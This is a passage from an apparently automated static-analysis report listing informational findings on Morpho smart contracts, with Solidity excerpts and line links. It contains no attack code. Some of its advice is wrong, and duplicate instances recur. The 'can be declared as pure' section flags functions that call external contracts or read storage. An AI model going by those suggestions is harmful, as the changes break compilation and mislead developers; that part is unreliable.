155:             require(newTimelock != timelock, ErrorsLib.ALREADY_SET);
156:     
157:             _setTimelock(newTimelock);
158:         }

172:     function setOwner(address newOwner) external onlyOwner {
173:             require(newOwner != owner, ErrorsLib.ALREADY_SET);
174:     
175:             _setOwner(newOwner);
176:         }

```

[143-148](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L143-L148), [154-158](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L154-L158), [172-176](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L172-L176)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

26:     function setRoot(bytes32 newRoot, bytes32 newIpfsHash) external;

27:     function setTimelock(uint256 newTimelock) external;

28:     function setRootUpdater(address updater, bool active) external;

30:     function setOwner(address newOwner) external;

```

[26](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L26), [27](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L27), [28](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L28), [30](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L30)




### Events that mark critical parameter changes should contain both the old and the new value

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

This should especially be done if the new value is not required to be different from the old value

*Instances (12)*:


```solidity
File: metamorpho/src/MetaMorpho.sol

191:         emit EventsLib.SetCurator(newCurator);

191:         emit EventsLib.SetCurator(newCurator);

200:         emit EventsLib.SetIsAllocator(newAllocator, newIsAllocator);

209:         emit EventsLib.SetSkimRecipient(newSkimRecipient);

209:         emit EventsLib.SetSkimRecipient(newSkimRecipient);

257:         emit EventsLib.SetFeeRecipient(newFeeRecipient);

257:         emit EventsLib.SetFeeRecipient(newFeeRecipient);

898:         emit EventsLib.UpdateLastTotalAssets(updatedTotalAssets);

```

[191](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L191), [191](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L191), [200](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L200), [209](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L209), [209](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L209), [257](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L257), [257](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L257), [898](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L898)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

168:         emit EventsLib.RootUpdaterSet(updater, active);

196:         emit EventsLib.OwnerSet(newOwner);

196:         emit EventsLib.OwnerSet(newOwner);

203:         emit EventsLib.TimelockSet(newTimelock);

```

[168](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L168), [196](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L196), [196](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L196), [203](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L203)




### Events should be emitted before external calls

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Ensure that events follow the best practice of check-effects-interaction, and are emitted before external calls

*Instances (4)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit withdraw() prior to emission of 
420:                 emit EventsLib.ReallocateWithdraw(_msgSender(), id, withdrawnAssets, withdrawnShares);

/// @audit withdraw() prior to emission of 
439:                 emit EventsLib.ReallocateSupply(_msgSender(), id, suppliedAssets, suppliedShares);

/// @audit safeTransfer() prior to emission of 
520:         emit EventsLib.Skim(_msgSender(), token, amount);

```

[420](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L420), [439](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L439), [520](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L520)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

/// @audit safeTransfer() prior to emission of 
135:         emit EventsLib.Claimed(account, reward, amount);

```

[135](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L135)



### Contract should expose an `interface`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

All `external`/`public` functions should extend an interface. This is useful to ensure that the whole API is extracted and can be more easily integrated by other projects.

*Instances (45)*:


```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

52:     function hasPermission(address account) public view virtual returns (bool) {

```

[52](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L52)

```solidity
File: metamorpho/src/MetaMorpho.sol

186:     function setCurator(address newCurator) external onlyOwner {

195:     function setIsAllocator(address newAllocator, bool newIsAllocator) external onlyOwner {

204:     function setSkimRecipient(address newSkimRecipient) external onlyOwner {

215:     function submitTimelock(uint256 newTimelock) external onlyOwner {

233:     function setFee(uint256 newFee) external onlyOwner {

248:     function setFeeRecipient(address newFeeRecipient) external onlyOwner {

265:     function submitGuardian(address newGuardian) external onlyOwner {

286:     function submitCap(MarketParams memory marketParams, uint256 newSupplyCap) external onlyCuratorRole {

308:     function submitMarketRemoval(Id id) external onlyCuratorRole {

325:     function setSupplyQueue(Id[] calldata newSupplyQueue) external onlyAllocatorRole {

346:     function updateWithdrawQueue(uint256[] calldata indexes) external onlyAllocatorRole {

397:     function reallocate(MarketAllocation[] calldata allocations) external onlyAllocatorRole {

451:     function revokePendingTimelock() external onlyGuardianRole {

460:     function revokePendingGuardian() external onlyGuardianRole {

469:     function revokePendingCap(Id id) external onlyCuratorOrGuardianRole {

478:     function revokePendingMarketRemoval(Id id) external onlyCuratorOrGuardianRole {

487:     function supplyQueueLength() external view returns (uint256) {

492:     function withdrawQueueLength() external view returns (uint256) {

497:     function acceptTimelock() external afterTimelock(pendingTimelock.validAt) {

502:     function acceptGuardian() external afterTimelock(pendingGuardian.validAt) {

507:     function acceptCap(Id id) external afterTimelock(pendingCap[id].validAt) {

513:     function skim(address token) external {

```

[186](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L186), [195](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L195), [204](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L204), [215](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L215), [233](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L233), [248](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L248), [265](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L265), [286](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L286), [308](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L308), [325](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L325), [346](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L346), [397](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L397), [451](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L451), [460](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L460), [469](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L469), [478](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L478), [487](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L487), [492](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L492), [497](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L497), [502](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L502), [507](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L507), [513](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L513)

```solidity
File: metamorpho/src/MetaMorphoFactory.sol

43:     function createMetaMorpho(
44:            address initialOwner,
45:            uint256 initialTimelock,
46:            address asset,
47:            string memory name,
48:            string memory symbol,
49:            bytes32 salt
50:        ) external returns (MetaMorpho metaMorpho) {

```

[43-50](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L43-L50)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol

42:     function aaveV2Repay(address asset, uint256 amount, uint256 interestRateMode) external payable protected {

57:     function aaveV2Withdraw(address asset, uint256 amount) external payable protected {

```

[42](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L42), [57](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L57)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV3MigrationBundler.sol

39:     function aaveV3Repay(address asset, uint256 amount, uint256 interestRateMode) external payable protected {

54:     function aaveV3Withdraw(address asset, uint256 amount) external payable protected {

```

[39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3MigrationBundler.sol#L39), [54](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3MigrationBundler.sol#L54)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol

41:     function compoundV2Repay(address cToken, uint256 amount) external payable protected {

67:     function compoundV2Redeem(address cToken, uint256 amount) external payable protected {

```

[41](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L41), [67](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L67)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV3MigrationBundler.sol

28:     function compoundV3Repay(address instance, uint256 amount) external payable protected {

50:     function compoundV3WithdrawFrom(address instance, address asset, uint256 amount) external payable protected {

74:     function compoundV3AllowBySig(
75:            address instance,
76:            bool isAllowed,
77:            uint256 nonce,
78:            uint256 expiry,
79:            uint8 v,
80:            bytes32 r,
81:            bytes32 s,
82:            bool skipRevert
83:        ) external payable protected {

```

[28](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L28), [50](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L50), [74-83](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L74-L83)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

94:     function borrowRateView(MarketParams memory marketParams, Market memory market) external view returns (uint256) {

100:     function borrowRate(MarketParams memory marketParams, Market memory market) external returns (uint256) {

```

[94](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L94), [100](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L100)

```solidity
File: morpho-blue-oracles/src/ChainlinkOracle.sol

116:     function price() external view returns (uint256) {

```

[116](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L116)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

80:     function submitRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {

91:     function acceptRoot() external {

100:     function revokePendingRoot() external onlyUpdaterRole {

115:     function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
116:             external
117:             returns (uint256 amount)
118:         {

143:     function setRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {

154:     function setTimelock(uint256 newTimelock) external onlyOwner {

163:     function setRootUpdater(address updater, bool active) external onlyOwner {

172:     function setOwner(address newOwner) external onlyOwner {

```

[80](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L80), [91](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L91), [100](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L100), [115-118](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L115-L118), [143](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L143), [154](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L154), [163](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L163), [172](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L172)

```solidity
File: universal-rewards-distributor/src/UrdFactory.sol

26:     function createUrd(
27:            address initialOwner,
28:            uint256 initialTimelock,
29:            bytes32 initialRoot,
30:            bytes32 initialIpfsHash,
31:            bytes32 salt
32:        ) public returns (UniversalRewardsDistributor urd) {

```

[26-32](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L26-L32)

</details>

- <a name="N-25"></a>[N-25] Function can be declared as `pure`
Functions below do not change the state of the contract and can be declared as pure. It will save gas and make the code more readable.

*Instances (22)*:
<details>
<summary>see instances</summary>


```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumBundler.sol

39:     function _isSenderAuthorized() internal view override(BaseBundler, MorphoBundler) returns (bool) {
40:            return MorphoBundler._isSenderAuthorized();
41:        }

```

[39-41](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumBundler.sol#L39-L41)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol

64:     function _isSenderAuthorized() internal view virtual override(BaseBundler, MigrationBundler) returns (bool) {
65:            return MigrationBundler._isSenderAuthorized();
66:        }

```

[64-66](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L64-L66)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol

78:     function _isSenderAuthorized() internal view override(BaseBundler, MigrationBundler) returns (bool) {
79:            return MigrationBundler._isSenderAuthorized();
80:        }

```

[78-80](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L78-L80)

```solidity
File: morpho-blue-bundlers/src/migration/MigrationBundler.sol

27:     function _isSenderAuthorized() internal view virtual override(BaseBundler, MorphoBundler) returns (bool) {
28:            return MorphoBundler._isSenderAuthorized();
29:        }

```

[27-29](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/MigrationBundler.sol#L27-L29)

```solidity
File: morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol

20:     function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
21:            if (address(feed) == address(0)) return 1;
22:    
23:            (, int256 answer,,,) = feed.latestRoundData();
24:            require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);
25:    
26:            return uint256(answer);
27:        }

31:     function getDecimals(AggregatorV3Interface feed) internal view returns (uint256) {
32:            if (address(feed) == address(0)) return 0;
33:    
34:            return feed.decimals();
35:        }

```

[20-27](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L20-L27), [31-35](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L31-L35)

```solidity
File: morpho-blue-oracles/src/libraries/VaultLib.sol

13:     function getAssets(IERC4626 vault, uint256 shares) internal view returns (uint256) {
14:            if (address(vault) == address(0)) return 1;
15:    
16:            return vault.convertToAssets(shares);
17:        }

```

[13-17](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/VaultLib.sol#L13-L17)

```solidity
File: morpho-blue/src/libraries/periphery/MorphoBalancesLib.sol

33:     function expectedMarketBalances(IMorpho morpho, MarketParams memory marketParams)
34:            internal
35:            view
36:            returns (uint256, uint256, uint256, uint256)
37:        {
38:            Id id = marketParams.id();
39:    
40:            Market memory market = morpho.market(id);
41:    
42:            uint256 elapsed = block.timestamp - market.lastUpdate;
43:    
44:            // Skipped if elapsed == 0 of if totalBorrowAssets == 0 because interest would be null.
45:            if (elapsed != 0 && market.totalBorrowAssets != 0) {
46:                uint256 borrowRate = IIrm(marketParams.irm).borrowRateView(marketParams, market);
47:                uint256 interest = market.totalBorrowAssets.wMulDown(borrowRate.wTaylorCompounded(elapsed));
48:                market.totalBorrowAssets += interest.toUint128();
49:                market.totalSupplyAssets += interest.toUint128();
50:    
51:                if (market.fee != 0) {
52:                    uint256 feeAmount = interest.wMulDown(market.fee);
53:                    // The fee amount is subtracted from the total supply in this calculation to compensate for the fact
54:                    // that total supply is already updated.
55:                    uint256 feeShares =
56:                        feeAmount.toSharesDown(market.totalSupplyAssets - feeAmount, market.totalSupplyShares);
57:                    market.totalSupplyShares += feeShares.toUint128();
58:                }
59:            }
60:    
61:            return (market.totalSupplyAssets, market.totalSupplyShares, market.totalBorrowAssets, market.totalBorrowShares);
62:        }

65:     function expectedTotalSupplyAssets(IMorpho morpho, MarketParams memory marketParams)
66:            internal
67:            view
68:            returns (uint256 totalSupplyAssets)
69:        {
70:            (totalSupplyAssets,,,) = expectedMarketBalances(morpho, marketParams);
71:        }

74:     function expectedTotalBorrowAssets(IMorpho morpho, MarketParams memory marketParams)
75:            internal
76:            view
77:            returns (uint256 totalBorrowAssets)
78:        {
79:            (,, totalBorrowAssets,) = expectedMarketBalances(morpho, marketParams);
80:        }

83:     function expectedTotalSupplyShares(IMorpho morpho, MarketParams memory marketParams)
84:            internal
85:            view
86:            returns (uint256 totalSupplyShares)
87:        {
88:            (, totalSupplyShares,,) = expectedMarketBalances(morpho, marketParams);
89:        }

95:     function expectedSupplyAssets(IMorpho morpho, MarketParams memory marketParams, address user)
96:            internal
97:            view
98:            returns (uint256)
99:        {
100:            Id id = marketParams.id();
101:            uint256 supplyShares = morpho.supplyShares(id, user);
102:            (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = expectedMarketBalances(morpho, marketParams);
103:    
104:            return supplyShares.toAssetsDown(totalSupplyAssets, totalSupplyShares);
105:        }

110:     function expectedBorrowAssets(IMorpho morpho, MarketParams memory marketParams, address user)
111:             internal
112:             view
113:             returns (uint256)
114:         {
115:             Id id = marketParams.id();
116:             uint256 borrowShares = morpho.borrowShares(id, user);
117:             (,, uint256 totalBorrowAssets, uint256 totalBorrowShares) = expectedMarketBalances(morpho, marketParams);
118:     
119:             return borrowShares.toAssetsUp(totalBorrowAssets, totalBorrowShares);
120:         }

```

[33-62](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoBalancesLib.sol#L33-L62), [65-71](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoBalancesLib.sol#L65-L71), [74-80](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoBalancesLib.sol#L74-L80), [83-89](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoBalancesLib.sol#L83-L89), [95-105](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoBalancesLib.sol#L95-L105), [110-120](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoBalancesLib.sol#L110-L120)

```solidity
File: morpho-blue/src/libraries/periphery/MorphoLib.sol

13:     function supplyShares(IMorpho morpho, Id id, address user) internal view returns (uint256) {
14:            bytes32[] memory slot = _array(MorphoStorageLib.positionSupplySharesSlot(id, user));
15:            return uint256(morpho.extSloads(slot)[0]);
16:        }

18:     function borrowShares(IMorpho morpho, Id id, address user) internal view returns (uint256) {
19:            bytes32[] memory slot = _array(MorphoStorageLib.positionBorrowSharesAndCollateralSlot(id, user));
20:            return uint128(uint256(morpho.extSloads(slot)[0]));
21:        }

23:     function collateral(IMorpho morpho, Id id, address user) internal view returns (uint256) {
24:            bytes32[] memory slot = _array(MorphoStorageLib.positionBorrowSharesAndCollateralSlot(id, user));
25:            return uint256(morpho.extSloads(slot)[0] >> 128);
26:        }

28:     function totalSupplyAssets(IMorpho morpho, Id id) internal view returns (uint256) {
29:            bytes32[] memory slot = _array(MorphoStorageLib.marketTotalSupplyAssetsAndSharesSlot(id));
30:            return uint128(uint256(morpho.extSloads(slot)[0]));
31:        }

33:     function totalSupplyShares(IMorpho morpho, Id id) internal view returns (uint256) {
34:            bytes32[] memory slot = _array(MorphoStorageLib.marketTotalSupplyAssetsAndSharesSlot(id));
35:            return uint256(morpho.extSloads(slot)[0] >> 128);
36:        }

38:     function totalBorrowAssets(IMorpho morpho, Id id) internal view returns (uint256) {
39:            bytes32[] memory slot = _array(MorphoStorageLib.marketTotalBorrowAssetsAndSharesSlot(id));
40:            return uint128(uint256(morpho.extSloads(slot)[0]));
41:        }

43:     function totalBorrowShares(IMorpho morpho, Id id) internal view returns (uint256) {
44:            bytes32[] memory slot = _array(MorphoStorageLib.marketTotalBorrowAssetsAndSharesSlot(id));
45:            return uint256(morpho.extSloads(slot)[0] >> 128);
46:        }

48:     function lastUpdate(IMorpho morpho, Id id) internal view returns (uint256) {
49:            bytes32[] memory slot = _array(MorphoStorageLib.marketLastUpdateAndFeeSlot(id));
50:            return uint128(uint256(morpho.extSloads(slot)[0]));
51:        }

53:     function fee(IMorpho morpho, Id id) internal view returns (uint256) {
54:            bytes32[] memory slot = _array(MorphoStorageLib.marketLastUpdateAndFeeSlot(id));
55:            return uint256(morpho.extSloads(slot)[0] >> 128);
56:        }

```

[13-16](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L13-L16), [18-21](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L18-L21), [23-26](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L23-L26), [28-31](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L28-L31), [33-36](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L33-L36), [38-41](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L38-L41), [43-46](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L43-L46), [48-51](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L48-L51), [53-56](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L53-L56)




### Hardcoded `address` should be avoided

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

It's better to declare the hardcoded addresses as immutable state variables, as this will facilitate deployment on other chains.

*Instances (3)*:

```solidity
File: morpho-blue-bundlers/src/ethereum/libraries/MainnetLib.sol

6:     address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

9:     address internal constant WST_ETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

12:     address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

```

[6](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L6), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L9), [12](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L12)



### Some variables have a implicit default visibility

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Consider always adding an explicit visibility modifier for variables, as the default is `internal`.

*Instances (3)*:

```solidity
File: morpho-blue-oracles/src/libraries/ErrorsLib.sol

10:     string constant NEGATIVE_ANSWER = "negative answer";

13:     string constant VAULT_CONVERSION_SAMPLE_IS_ZERO = "vault conversion sample is zero";

16:     string constant VAULT_CONVERSION_SAMPLE_IS_NOT_ONE = "vault conversion sample is not one";

```

[10](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ErrorsLib.sol#L10), [13](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ErrorsLib.sol#L13), [16](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ErrorsLib.sol#L16)



### for modern and more readable code; update import usages

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Solidity code is also cleaner in another way that might not be noticeable: the struct Point. We were importing it previously with global import but not using it. The Point struct polluted the source code with an unnecessary object we were not using because we did not need it. This was breaking the rule of modularity and modular programming: only import what you need Specific imports with curly braces allow us to apply this rule better.
`import {contract1 , contract2} from "filename.sol";`

*Instances (1)*:

```solidity
File: morpho-blue/src/Morpho.sol

25: import "./libraries/ConstantsLib.sol";

```

[25](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L25)



### Named imports of parent contracts are missing

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (6)*:

```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

80: interface IMetaMorphoStaticTyping is IMetaMorphoBase {

